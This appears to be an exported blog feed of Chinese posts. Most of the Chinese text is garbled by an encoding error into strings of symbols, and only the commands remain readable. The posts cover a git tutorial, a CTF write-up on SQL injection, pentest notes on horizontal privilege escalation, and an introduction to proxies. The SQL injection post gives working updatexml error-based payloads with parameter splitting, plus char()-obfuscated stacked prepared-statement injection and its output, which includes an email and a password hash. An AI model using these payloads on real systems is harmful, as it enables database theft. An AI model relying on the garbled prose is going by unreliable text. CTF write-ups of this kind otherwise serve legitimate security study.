‰∏Ä‰∏™ÁâàÊú¨Â∫ìÂ≠òÊîæ‰∏Ä‰∏™È°πÁõÆÔºåÂπ∂‰∏îÂ∑≤ÁªèÊé®ÈÄÅÂà∞github‰∏ä‰æõ‰∫∫‰∏ãËΩΩÔºåÊ≠§Êó∂‰Ω†Ë¶ÅÊõ¥Êñ∞Âà∞‰∏ã‰∏Ä‰∏™ÁâàÊú¨ÔºåËøõË°å‰øÆÊîπÊé®ÈÄÅÂà∞ÁΩëÁ´ô‰∏äÔºå‰ΩÜÊòØ‰Ω†ÂèëÁé∞Êúâ‰∏Ä‰∏™Â§ßbugÔºå‰ΩÜÊòØÊó∂Èó¥Â§™‰πÖËÆ∞‰∏çÊ∏Ö‰øÆÊîπ‰∫ÜÂì™ÈáåÔºåÊØïÁ´üÈÇ£‰πàÂ§öÁªÜËäÇÔºåÊ≠§Êó∂Â∞±ÂèØ‰ª•Áî®gitÊåâÁÖßÊó•ÊúüÂõûÈÄÄÁâàÊú¨ÔºåÂú®ËøõË°å‰ªéÊñ∞ÂºÄÂèë„ÄÇÂØπ‰ªªÊÑèÊó∂Èó¥ÊÆµÁöÑÁâàÊú¨ÈáçÁΩÆ„ÄÇÂπ∂‰∏î‰Ω†ÂèØ‰ª•ÂØπÊØèÊ¨°ÊîπÂä®Â¢ûÂä†‰∏Ä‰∏™Â§áÊ≥®ÔºåÊØîÂ¶ÇÔºö ÁâàÊú¨ Êñá‰ª∂Âêç Êìç‰Ωú‰∫∫ ËØ¥Êòé Êó•Êúü 1 test.txt guest Â¢ûÂä†È°πÁõÆ1 2018.1.1 2 test.txt admin Âà†Èô§Á¨¨‰∫îË°å 2018.2.1 2 test.txt admin ‰øÆÊîπÁÆ°ÁêÜÂëòÂØÜÁ†Å 2018.2.1ËøôÊ†∑ÂèØ‰ª•ÊûÅÂ§ßÊñπ‰æøÂºÄÂèë‰∫∫ÂëòÊìç‰Ωú‰∫∫ÂëòÁöÑ‰øÆÊîπÊé®ÈÄÅ„ÄÇ windows‰∏ãgitbashÂú®windows‰∏ãÂÆâË£ÖgitÂ∑•ÂÖ∑Ôºå‰∏ãËΩΩÂÆâË£ÖÁΩë‰∏äÊïôÁ®ãËá™ÂØª„ÄÇ ÁÑ∂ÂêéÊâìÂºÄgitbashÔºå‰∏Ä‰∏™gitÂëΩ‰ª§Ë°åÔºå‰∏Ä‰∫õlinuxÂëΩ‰ª§ windowsÂëΩ‰ª§ÂèØ‰ª•‰ΩøÁî®ÔºåËá™Â∑±‰Ωì‰ºö‰∏ã„ÄÇ ‰∏ÄÂàáÁöÑÊìç‰ΩúÈÉΩÂü∫‰∫égit bashÊìç‰ΩúÔºåÊé•‰∏ãÊù•Êàë‰ª¨ËØ¶Ëß£gitÂëΩ‰ª§„ÄÇ gitÂëΩ‰ª§Â≠¶‰π†git init //ÊääËøô‰∏™ÁõÆÂΩïÂèòÊàêgitÂèØ‰ª•ÁÆ°ÁêÜÁöÑ‰ªìÂ∫ì.gitÁõÆÂΩïÊòØGitÊù•Ë∑üË∏™ÁÆ°ÁêÜÁâàÊú¨ÁöÑÔºå‰∏çË¶ÅËΩªÊòìÊîπÂä®„ÄÇ2.ÂàõÂª∫Êñá‰ª∂Â§π mkdir test ÂàõÂª∫Êñá‰ª∂ touch 1.txt 3.‰º†ÈÄÅÂà∞Êàë‰ª¨ÁöÑ‰ªìÂ∫ì git add 1.txt //Â∞Ü1.txtÊ∑ªÂä†Âà∞ÊöÇÂ≠òÂå∫„ÄÇÂ¶ÇÊûúÊÉ≥Ë¶ÅÂ∞ÜÊú¨Êñá‰ª∂Â§πÂÖ®ÈÉ®Ê∑ªÂä†Âà∞ÊöÇÂ≠òÂå∫ÈÇ£‰πàÂèØ‰ª• git add . git commitÂëäËØâGit Ê∑ªÂä†Âà∞‰ªìÂ∫ìgit commit -m ‚Äòpqtest‚Äô//ÊääÊñá‰ª∂Êèê‰∫§Âà∞‰ªìÂ∫ìÔºåpqtest‰∏∫Êú¨Ê¨°‰øÆÊîπÁöÑÂ§áÊ≥®ÔºåÈÄöÂ∏∏Áî®Êù•Â§áÊ≥®Â§ç‰∫ÜÊüêÊüêbugÁ≠â ËøòÊúâ‰∏ÄÊ≠•Êé®ÈÄÅÂá∫ÂéªÔºå‰∏ãÈù¢ÊñáÁ´†ÁöÑgithub‰ºöËÆ≤Âà∞„ÄÇ4.statusÊü•ÁúãÂΩìÂâçÁä∂ÊÄÅgit status //Êü•ÁúãÁä∂ÊÄÅÊòØÂê¶ÊúâÊñá‰ª∂Êú™Êèê‰∫§ git bashÊîØÊåÅËÆ∏Â§ölinuxÂëΩ‰ª§ÔºåËá™Â∏¶viÊàë‰ª¨vi 1.txt‰øÆÊîπ Â¢ûÂä†Âá†‰∏™1111git diff 1.txtÂç≥ÂèØÁúãÂà∞Â¢ûÂä†Âà†ÂáèÁöÑ‰∏úË•ø„ÄÇÊàñËÄÖ git diffÂç≥ÂèØÁúãÂà∞ÊâÄÊúâÊúâÂèòÂä®ÁöÑÊõ¥Êîπ„ÄÇ 5.Êü•ÁúãÊõ¥ÊîπÊó•Âøó git log Êü•ÁúãÊõ¥ÊîπÊó•Âøó„ÄÇ6.ÁâàÊú¨ÂõûÈÄÄ git reset ‚Äìhard HEAD^ //ÁâàÊú¨ÂõûÈÄÄÂà∞‰∏ä‰∏Ä‰∏™ÁâàÊú¨„ÄÇÂõûÈÄÄ‰πãÂêé git log‰πüÁõ∏Â∫îÂú∞Âà†Èô§„ÄÇ git reflog Êù•Êü•ÁúãÂéÜÂè≤Êìç‰ΩúÔºåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞ÂõûÈÄÄÁöÑÁâàÊú¨„ÄÇÂèØ‰ª•ÂÜçÊ¨°ÂõûÈÄÄÂà∞‰πãÂâçÁöÑÁâàÊú¨„ÄÇ git reset ‚Äìhard 96ddb1f 7.Êí§ÈîÄÊìç‰ΩúÂ¶ÇÊûú‰Ω†‰∏çÂ∞èÂøÉ‰øÆÊîπ‰∫ÜÊñá‰ª∂Ôºå‰ΩÜÊòØÂøòËÆ∞‰øÆÊîπ‰∫ÜÂì™ÈáåÂæàÁªÜÂ∞èÁöÑÁªÜËäÇ„ÄÇÊúâ‰∏§ÁßçÊñπÊ≥ï„ÄÇÁ¨¨‰∏ÄÁßçÂèØ‰ª•ÁâàÊú¨ÂõûÈÄÄÂà∞‰∏ä‰∏Ä‰∏™ÁâàÊú¨ Ôºögit reset ‚Äìhard HEAD^Á¨¨‰∫åÁßçÊí§ÈîÄÊñá‰ª∂Êìç‰ΩúÔºågit checkout ‚Äì 1.txt ÔºàÊØîÂ¶ÇÊàë‰øÆÊîπÁöÑÊòØ1.txtÔºâ githubÁÆ°ÁêÜ1.Êàë‰ª¨ÂÖà‰ªéÊú¨Âú∞ËøûÊé•Âà∞githubÔºåÈ¶ñÂÖàÂàõÂª∫‰∏Ä‰∏™È°πÁõÆ/Â∫ì 2.ÁÑ∂ÂêéÊâìÂºÄgitbash ËæìÂÖ•ÂëΩ‰ª§Ôºössh-keygen -t rsa -C ‚Äúxxx@qq.com‚Äú//Â°´ÂÜôËá™Â∑±Ê≥®ÂÜåÁöÑÈÇÆÁÆ±Âç≥ÂèØ ‰∏ÄË∑ØÂõûËΩ¶ ÂÖ∂‰∏≠Ôºà/c/users/1/.ssh/id_rsaÔºâÁõÆÂΩïÂ≠òÊîæÂØÜÈí•„ÄÇ//ÊàëËá™Â∑±ÈªòËÆ§ÁöÑË∑ØÂæÑÔºå‰∏äÂõæ‰∏≠Á¨¨ÂõõË°å ÊâìÂºÄ https://github.com/settings/ssh/new title ÂÜôÂ§áÊ≥®ÔºåKeyÂ°´ÂÜôÂàöÂàöËøûÊé•ÁöÑÊó∂ÂÄôÁõÆÂΩï‰∏ãÁöÑÂØÜÈí•Ôºåid_rsa.pubÊñá‰ª∂ÊâìÂºÄÂ§çÂà∂ÂØÜÈí•ÔºåÂÖ®ÈÉ®‰øùÂ≠òÂà∞KeyÁÑ∂ÂêéÊ∑ªÂä†ÂØÜÈí•Âç≥ÂèØ„ÄÇ ÁÑ∂ÂêéÊ£ÄÈ™åÊòØÂê¶ÊàêÂäüËøûÊé• ËæìÂÖ•ÂëΩ‰ª§ ssh -T git@github.com Â¶ÇÊûú‰Ω†ÊòØÁ¨¨‰∏ÄÊ¨°ÔºåËæìÂÖ•yesÂ∞±ÂèØ‰ª•‰∫ÜÔºåÊàëËøô‰∏™ÊòØ‰πãÂâçÈÖçÁΩÆËøáÊâÄ‰ª•Áõ¥Êé•ÊòæÁ§∫successful,Â¶ÇÊûú‰Ω†ÁöÑÊòØÂá∫Áé∞‰∏çÊòØËøô‰∫õÂÜÖÂÆπÔºåÊúâÂèØËÉΩÊòØÊòæÁ§∫ÊùÉÈôêÈóÆÈ¢ò‰ªÄ‰πàÁöÑÔºåÂ∞±Â∫îËØ•ÊòØÊàë‰∏äÈù¢ÊèêÂà∞ÁöÑÈÇ£ÁßçÊÉÖÂÜµÔºå‰Ω†Áúã‰∏Ä‰∏ã‰Ω†ÁîüÊàêÂØÜÈí•Êó∂ÊòØÂê¶Êìç‰ΩúÊ≠£Á°ÆÔºåÁõÆÂΩï‰∏ãÊòØÂê¶ÊúâÈÇ£‰∏™known_hostsËøô‰∏™Êñá‰ª∂„ÄÇ 3.ÊúÄÂêéÈÖçÁΩÆconfig git config ‚Äìglobal user.name ‚ÄúÁî®Êà∑Âêç‚Äù git config ‚Äìglobal user.email ‚ÄúÈÇÆÁÆ±‚Äù ÈÖçÁΩÆÂÆåÊàêËæìÂÖ•ÂëΩ‰ª§ git config ‚Äìglobal ‚ÄìlistÊü•ÁúãÊòØÂê¶ÈÖçÁΩÆÊàêÂäü„ÄÇGitÂíågithubÈÖçÁΩÆÂÆå‰∫ÜÔºåÁé∞Âú®ÂèØ‰ª•Âú®githubÊâòÁÆ°Êàë‰ª¨ÁöÑÈ°πÁõÆ‰∫Ü„ÄÇ 4.ÊâìÂºÄ‰∏Ä‰∏™Êñá‰ª∂Â§πÊâìÂºÄgit bashÔºå‰ΩøÁî®ËæìÂÖ•ÂëΩ‰ª§git initÊù•‰Ωø‰ªñÊàê‰∏∫‰∏Ä‰∏™‰ªìÂ∫ì„ÄÇ 5.ÁÑ∂ÂêéËøúÁ®ãËøûÊé•Âà∞‰ªìÂ∫ì„ÄÇ ËæìÂÖ•ÂëΩ‰ª§Ôºögit remote add origin git@github.com:shuaizhupeiqi/test shuaizhupeiqiÔºåÊòØÊàëÁöÑÁî®Êà∑ÂêçÔºåtestÊòØ‰ªìÂ∫ìÂêçÂ≠ó 6.Áî±‰∫éÂàõÂª∫‰ªìÂ∫ìÁöÑÊó∂ÂÄôÔºåÈªòËÆ§ÂàõÂª∫‰∫Üreadme.md,ÊâÄ‰ª•Êú¨Âú∞ÊòØ‰∏é‰ªìÂ∫ì‰∏çÂêåÊ≠•ÁöÑ„ÄÇÊàë‰ª¨ÂÖàÂêåÊ≠•‰∏Ä‰∏ã„ÄÇ git pull git@github.com:shuaizhupeiqi/test 7.‰∏ä‰º†Êõ¥Êñ∞ Á¨¨‰∏ÄÊ≠•Ôºögit add . //ÂêéÈù¢ÊòØ‰∏Ä‰∏™Ëã±ÊñáÁöÑ.Á¨¨‰∫åÊ≠•Ôºögit commit ‚Äìm ‚Äú1‚Äù (Â¶ÇÊûúÊèê‰∫§Âçï‰∏™Êñá‰ª∂1ÔºåÂ∞±ËøôÊ†∑ÂÜôÔºõÂ¶ÇÊûúÊèê‰∫§ÊâÄÊúâÊñá‰ª∂ÔºåÂÜôÊàêÔºögit commit ‚Äìm *)Á¨¨‰∏âÊ≠•Ôºögit push git@github.com:shuaizhupeiqi/test//ËøôÊ†∑Â∞±ÂèØ‰ª•Êé®ÈÄÅ‰∏äÂéª‰∫Ü„ÄÇ ËøôÊ†∑Â∞±ÂÆåÊàê‰∫Ü„ÄÇ]]></content>
      <tags>
        <tag>ÊùÇ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlÊ≥®ÂÖ•]]></title>
    <url>%2F2018%2F12%2F03%2Fsql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÊ≥®ÂÖ•ÂçÉÁôæÊ†∑ÔºåÊú¨Êñá‰ªÖËÆ∞ÂΩï‰∏Ä‰∫õÂßøÂäø‰æõ‰∏™‰∫∫Êü•ÈòÖ„ÄÇËΩªÂñ∑„ÄÇ HTTPÂàÜÂâ≤Ê≥®ÂÖ•È¢òÁõÆÂú∞ÂùÄÂÆûÈ™åÂêßÔºöÂä†‰∫ÜÊñôÁöÑÊä•ÈîôÊ≥®ÂÖ•„ÄÇÂú∞ÂùÄÔºöhttp://ctf5.shiyanbar.com/web/baocuo/index.php Êü•ÁúãÈ°µÈù¢Ê∫ê‰ª£Á†ÅÔºåÁªôÂá∫‰∫ÜÊàë‰ª¨sqlÊü•ËØ¢ËØ≠Âè•ÂæàÂ∏∏ËßÑ &lt;!-- $sql=&quot;select * from users where username=&apos;$username&apos; and password=&apos;$password&apos;&quot;; --&gt;Ê†πÊçÆÊèêÁ§∫ post‰º†‰∏Ä‰∏™usernameÂíåpasswordÁÑ∂ÂêéÂºÄÂßãÊ≥®ÂÖ• ËØ≠Âè•Ôºö username=admin&apos; or &apos;&amp;password=adminÊòæÁ§∫ You are our member, welcome to enterÔºåÂèØ‰ª•ËØ¥ÊòéÂçïÂºïÂè∑Á©∫Ê†ºÊ≤°ÊúâË¢´ËøáÊª§Ôºå‰∏çËøáÊó¢ÁÑ∂ÊòØÊä•ÈîôÊ≥®ÂÖ•ÔºåÈÇ£‰πàÂä†‰∏™ÂçïÂºïÂè∑ËØïËØï„ÄÇ ËØ≠Âè•Ôºö username=admin&apos;&amp;password=adminYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‚Äòadmin‚Äô‚Äô at line 1 Êé•‰∏ãÊù•ÂÜôÊä•ÈîôËØ≠Âè•ËØ≠Âè•Ôºö username=admin&apos;and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &apos;&amp;password=admin‰∏ÄÁøªÊµãËØï‰πãÂêéÂèëÁé∞,Êúâ‰∏™Á•ûÂ•áÁöÑËøáÊª§ÔºåusernameËøáÊª§‰∫ÜÔºàÔºâÔºåpasswordËøáÊª§‰∫Ü‰∏ÄÂàáÊä•ÈîôÂáΩÊï∞„ÄÇ ÂèØ‰ª•ÁªÑÂêà‰∏Ä‰∏ã„ÄÇusernameÂÜôÂáΩÊï∞updatexml„ÄÇpasswordÂÜôÔºàÔºâÔºå‰ΩÜÊòØÊÄé‰πàÂêàÂπ∂‰∏∫‰∏ÄËµ∑Âë¢ÔºåÊÉ≥Âà∞sqlËØ≠Âè•ÊòØ select * from users where username=&apos;$username&apos; and password=&apos;$password $username=updatexm/*,$password=*/...ËøôÊ†∑sqlËØ≠Âè•‰ºöÂèòÊàê select * from users where username=&apos;updatexm/* and password=&apos;*/...ËøôÊ†∑‰æøÂèØ‰ª•Ê≥®ÈáäÊéâ‰∏≠Èó¥ÁöÑ‰ª£Á†Å‰∏ÄÁßçÈ™öÂßøÂäøÔºåÊé•‰∏ãÊù•ÁªßÁª≠Ê≠£Â∏∏Ê≥®ÂÖ•„ÄÇ username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select database()),0x7e),1) or &apos; ÊàêÂäüÁàÜÂá∫Êù•Êï∞ÊçÆÂ∫ìÂêçÁß∞„ÄÇ ËØ≠Âè• username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select table_name from information_schema.tables where table_schema =&apos;error_based_hpf&apos;),0x7e),1) or &apos;=Âè∑Ë¢´ËøáÊª§ÔºåÂèØ‰ª•‰ΩøÁî®Ê≠£ÂàôÊ≥®ÂÖ•Ôºå‰πüÂ∞±ÊòØ=Êç¢Êàêregexp username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp&apos;error_based_hpf&apos;),0x7e),1) or &apos;ËøôÈáå‰ΩøÁî®group_concatÊù•ÁàÜÂá∫ÊâÄÊúâÁöÑË°®ÂêçÂ≠ó XPATH syntax error: &apos;~ffll44jj,users~&apos;Êü•Âàó username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name regexp&apos;ffll44jj&apos;),0x7e),1) or &apos; XPATH syntax error: &apos;~value~&apos;Êü•Êï∞ÊçÆ username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select value from ffll44jj),0x7e),1) or &apos; XPATH syntax error: &apos;~flag{err0r_b4sed_sqli_+_hpf}~&apos;Â¶ÇÊûúflagË∂ÖËøá32‰ΩçÔºåÂèØ‰ª•midÊà™Êñ≠Êù•Êü•ËØ¢„ÄÇ‰∏çËøáÊú¨È¢ò‰∏≠ÊòØÁ¶ÅÊ≠¢‰∫ÜmidÂáΩÊï∞ÁöÑ‰∏çËøá‰πü‰∏çË∂ÖËøá32‰ΩçÂèØ‰ª•Áõ¥Êé•Ëé∑Âèñflag„ÄÇ Â†ÜÂè†È¢ÑÁºñËØëÊ≥®ÂÖ•È¶ñÂÖà‰∫ÜËß£‰∏ãÈ¢ÑÂ§ÑÁêÜËØ≠Âè• È¢ÑÂà∂ËØ≠Âè•ÁöÑSQLËØ≠Ê≥ïÂü∫‰∫é‰∏â‰∏™SQLËØ≠Âè•Ôºö PREPARE stmt_name FROM preparable_stmt; EXECUTE stmt_name [USING @var_name [, @var_name] ...]; {DEALLOCATE | DROP} PREPARE stmt_name;ÂØπ‰∫é‰∏çÁ°ÆÂÆöÂèÇÊï∞‰ª•ÈóÆÂè∑‰ª£ÊõøÔºåÁÑ∂ÂêéusingÂä†ÂÖ•ÂèÇÊï∞Âç≥ÂèØ„ÄÇ È¢ÑÂ§ÑÁêÜËØ≠Âè•ÂèØ‰ª•ÂíåÊ≠£Â∏∏Êü•ËØ¢‰∏ÄÊ†∑Ôºå‰ΩÜÊòØÊü•ËØ¢ÊñπÂºèÁ®çÊúâÂèòÂåñÔºåÂú®‰∏Ä‰∫õÁªïËøá‰∏≠ÂèØ‰ª•Âà©Áî®ËøôÁßçÊú∫Âà∂Êù•ËøõË°åsqlÊ≥®ÂÖ•„ÄÇ Â†ÜÂè†Ê≥®ÂÖ• Âú®‰∏ÄÊù°sqlËØ≠Âè•ÊâßË°åÂÆåÊØïÂêéÔºå‰ΩøÁî®ÂàÜÂè∑ÁªìÂ∞æÔºåÁÑ∂ÂêéÂà©Áî®Â§öÊù°ËØ≠Âè•ÊâßË°åÁâπÊÄßÔºåÁÑ∂ÂêéÂÆåÊï¥ÊîªÂáª„ÄÇ ÁÆÄÂçïÁöÑÂ†ÜÂè†Êü•ËØ¢„ÄÇ mysql&gt; set @a=&apos;select * from user where id =1&apos;;prepare stmt from @a;execute stmt; Query OK, 0 rows affected (0.00 sec) Query OK, 0 rows affected (0.00 sec) Statement prepared +----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+ | ID | username | email | password | img | +----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+ | 1 | 275640346@qq.com | 275640346@qq.com | 20905fe3160505df06abf12bfc8294fa | ../upload/54223df3e0247c41ce29176d227f95cf/ae566253288191ce5d879e51dae1d8c3.png | +----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+ 1 row in set (0.00 sec)Âà©Áî®mysqlÁöÑÁâπÊÄßÂØπÂçÅÂÖ≠ËøõÂà∂‰πüÂèØËøõË°åÊü•ËØ¢„ÄÇ Â¶ÇÊûúÂØπprepare excuteÁ≠âÂÖ≥ÈîÆËØçÊó†ËøáÊª§‰æøÂèØ‰ª•Áî®Ëøô‰∏™ÁâπÊÄßÁªïËøáÂæàÂ§öÂÖ≥ÈîÆËØçÊù•ËææÂà∞sqlÊ≥®ÂÖ•ÊïàÊûú„ÄÇ ÊàñËÄÖasciiÊù•Ëß£Á†ÅËøõË°åÊ≥®ÂÖ• mysql&gt; set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41)); prepare a from @s;execute a;Query OK, 0 rows affected (0.00 sec) Query OK, 0 rows affected (0.00 sec)Statement prepared +------------+ | database() | +------------+ | qwb | +------------+ 1 row in set (0.00 sec) mysql&gt; select concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41)); +---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41)) | +---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | select database() | +---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) ÂèÇËÄÉÂº∫ÁΩëÊùØweb-Èöè‰æøÊ≥® https://k-ring.github.io/2019/05/28/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwriteup/]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webÊºèÊ¥û‰πãË∂äÊùÉ]]></title>
    <url>%2F2018%2F12%2F02%2Fweb%E6%BC%8F%E6%B4%9E%E8%B6%8A%E6%9D%83%2F</url>
    <content type="text"><![CDATA[Ê∞¥Âπ≥Ë∂äÊùÉÂÆûÊàòÂú®‰∏ÄÊ¨°Ê∏óÈÄèÊµãËØï‰∏≠ÈÅáÂà∞Âá†‰∏™ÁªèÂÖ∏ÁöÑÊ∞¥Âπ≥Ë∂äÊùÉÊºèÊ¥ûÔºå‰ª•ÂèäÂá†‰∏™ÊùÉÈôêÁªïËøá„ÄÇ Â¢ûÂä†‰ªªÊÑèÁî®Êà∑ÁöÑË¥≠Áâ©ËΩ¶ ÁÇπÂáªÂä†ÂÖ•Ë¥≠Áâ©ËΩ¶ÁÑ∂ÂêéÊäìÂåÖÔºå ‰∏ÄËà¨Ë∂äÊùÉÊºèÊ¥ûÈÉΩ‰ºöÂ∞Ü‰ø°ÊÅØÊîæÂú®cookie‰∏≠Ôºå‰∏•ÂØÜÁöÑÈÉΩ‰ºöÂä†tokenÔºåÊ≠§Ê¨°ÈÅáÂà∞ÁöÑ‰∏Ä‰∏™Ê∞¥Âπ≥Ë∂äÊùÉÔºåÈ™åËØÅÁöÑ‰ø°ÊÅØÂÖ®ÈÉ®ÊîæÂú®cookieÈáåÔºåÂπ∂‰∏î‰ª• userinfoÂèÇÊï∞È™åËØÅÔºåËÄêÂøÉÊµãËØïÔºåÂêéÂè∞È™åËØÅÁöÑ‰∏∫IDÔºå‰πüÂ∞±ÊòØËØ¥Âè™Ë¶Å‰Ω†‰øÆÊîπÂØπÂ∫îIDÔºåÈÇ£‰πàÂ∞±‰ºöÂä†ÂÖ•Âà∞ÂØπÂ∫îÁî®Êà∑ÁöÑË¥≠Áâ©ËΩ¶‰∫ÜÔºå‰∏ÄËà¨ËøôÁßçÊé•Âè£ÈÉΩÊòØÁΩëÁ´ôÔºåÊâÄ‰ª•ÁΩëÁ´ô‰πüÂèØËÉΩÂÖ®ÈÉ®ÈÉΩÊòØÈ™åËØÅID„ÄÇÂêåÊ†∑Â≠òÂú®Ê∏ÖÁ©∫Ë¥≠Áâ©ËΩ¶ÔºåÂà†Èô§Âú∞ÂùÄÊºèÊ¥ûÔºåÊ∞¥Âπ≥Ë∂äÊùÉ„ÄÇ Ê≠§Ê¨°Ê∏óÈÄèÊµãËØïÊÄªÁªì‰∏Ä‰∏™Â∞èÁªèÈ™åÔºåÂú®ÊµãËØïÂêéÂè∞Âà∞Â∫ïÈ™åËØÅ‰ªÄ‰πàÂèÇÊï∞ÁöÑÊó∂ÂÄôÂèØ‰∏Ä‰∏™‰∏Ä‰∏™ÊäìÂåÖÔºåÂà†Èô§ÂÖ∂‰ªñÂèÇÊï∞ÔºåÂâ©‰∏ãËá™Â∑±ÊâÄË¶ÅÂ∞ùËØïÁöÑÔºåÂ¶ÇÊûúÂ§±Ë¥•Êõ¥Êç¢ÂèÇÊï∞ÁªßÁª≠ÊµãËØïÔºå‰πüÊúâÂæàÂ§öÊó∂ÂÄô‰ªñÊòØcallbackÂ§öÂ±ÇËÆ§ËØÅÁî®Êà∑‰ø°ÊÅØÔºåÊâÄ‰ª•ÂèØËÉΩÂú®ÂêéÈù¢‰∏Ä‰∏™ÂåÖÈáåÔºåÊÄª‰πãËÄêÂøÉÁÇπÊµãËØïÔºåÊ≠§Ê¨°ÊµãËØï‰πüÂèëÁé∞‰∏Ä‰∏™callbackjsonp,‰∏∫ËøîÂõûÁî®Êà∑‰ø°ÊÅØËÆ§ËØÅÔºåÂ≠òÂú®Áî®Êà∑ÊïèÊÑü‰ø°ÊÅØ„ÄÇÊÉÖÂÜµÂÖÅËÆ∏ÁöÑÊó∂ÂÄôÂèØ‰ª•‰∏ÄÂ•óÁªÑÂêàÊã≥Â∏¶Ëµ∞ÔºÅ]]></content>
      <tags>
        <tag>webÊºèÊ¥û</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ê≠£ÂèçÂêë‰ª£ÁêÜ]]></title>
    <url>%2F2018%2F11%2F25%2F%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[‰ª£ÁêÜÊúçÂä°Âô®‰ªÄ‰πàÊòØ‰ª£ÁêÜÊúçÂä°Âô®ÔºàProxy ServeÔºâÔºüÊèê‰æõ‰ª£ÁêÜÊúçÂä°ÁöÑÁîµËÑëÁ≥ªÁªüÊàñÂÖ∂ÂÆÉÁ±ªÂûãÁöÑÁΩëÁªúÁªàÁ´Ø,‰ª£ÊõøÁΩëÁªúÁî®Êà∑ÂéªÂèñÂæóÁΩëÁªú‰ø°ÊÅØ„ÄÇ ‰ª£ÁêÜÊúçÂä°Âô®ÔºàProxy ServerÔºâÊòØ‰∏ÄÁßçÈáçË¶ÅÁöÑÊúçÂä°Âô®ÂÆâÂÖ®ÂäüËÉΩÔºåÂÆÉÁöÑÂ∑•‰Ωú‰∏ªË¶ÅÂú®ÂºÄÊîæÁ≥ªÁªü‰∫íËÅî(OSI)Ê®°ÂûãÁöÑ‰ºöËØùÂ±ÇÔºå‰ªéËÄåËµ∑Âà∞Èò≤ÁÅ´Â¢ôÁöÑ‰ΩúÁî®„ÄÇ‰ª£ÁêÜÊúçÂä°Âô®Â§ßÂ§öË¢´Áî®Êù•ËøûÊé•INTERNETÔºàÂõΩÈôÖ‰∫íËÅîÁΩëÔºâÂíåLocal Area NetworkÔºàÂ±ÄÂüüÁΩëÔºâ„ÄÇ ‰ª£ÁêÜÈ°æÂêçÊÄù‰πâÔºåÊòØ‰ª£Êõø‰Ω†ÂÅö‰∏Ä‰∫õ‰∫ãÊÉÖÔºåÊää‰∫ãÊÉÖ‰∫§Áªô‰ª£ÁêÜÔºå‰ªñÂéªÂ∏Æ‰Ω†ÂÅö‰Ω†ÊÉ≥ÂÅöÁöÑ„ÄÇ‰∏æ‰æãÔºö‰Ω†ÊÉ≥ÂéªÂ•≥ÂØùÂèñ‰∏úË•øÔºåÁ¢ç‰∫éÁî∑‰∫∫Ë∫´‰ªΩÔºåÊâæ‰∏™Â•≥ÂêåÂ≠¶Â∏Æ‰Ω†ÂéªÂèñÔºåËøô‰∏™Â•≥‰∫∫ÂêåÂ≠¶Â∞±ÊòØ‰ª£ÁêÜ„ÄÇÂ¶ÇÊûúÂ•≥ÂêåÂ≠¶ÊÉ≥ÈöêËóè‰Ω†ÁöÑË∫´‰ªΩÂ∞±‰∏ç‰ºöÂëäËØâÂÆøÁÆ°ÈòøÂß®Ôºå‰πüÂèØ‰ª•ËææÂà∞ÈöêÂåøË∫´‰ªΩÁöÑ‰ΩúÁî®„ÄÇ ‰∏∫Âï•‰ΩøÁî®‰ª£ÁêÜÊúçÂä°Âô®1.ÊèêÈ´òËÆøÈóÆÈÄüÂ∫¶Áî±‰∫éÁõÆÊ†á‰∏ªÊú∫ËøîÂõûÁöÑÊï∞ÊçÆ‰ºöÂ≠òÊîæÂú®‰ª£ÁêÜÊúçÂä°Âô®ÁöÑÁ°¨Áõò‰∏≠ÔºåÂõ†Ê≠§‰∏ã‰∏ÄÊ¨°ÂÆ¢Êà∑ÂÜçËÆøÈóÆÁõ∏ÂêåÁöÑÁ´ôÁÇπÊï∞ÊçÆÊó∂Ôºå‰ºöÁõ¥Êé•‰ªé‰ª£ÁêÜÊúçÂä°Âô®ÁöÑÁ°¨Áõò‰∏≠ËØªÂèñÔºåËµ∑Âà∞‰∫ÜÁºìÂ≠òÁöÑ‰ΩúÁî®ÔºåÂ∞§ÂÖ∂ÂØπ‰∫éÁÉ≠Èó®ÁΩëÁ´ôËÉΩÊòéÊòæÊèêÈ´òËÆøÈóÆÈÄüÂ∫¶„ÄÇ 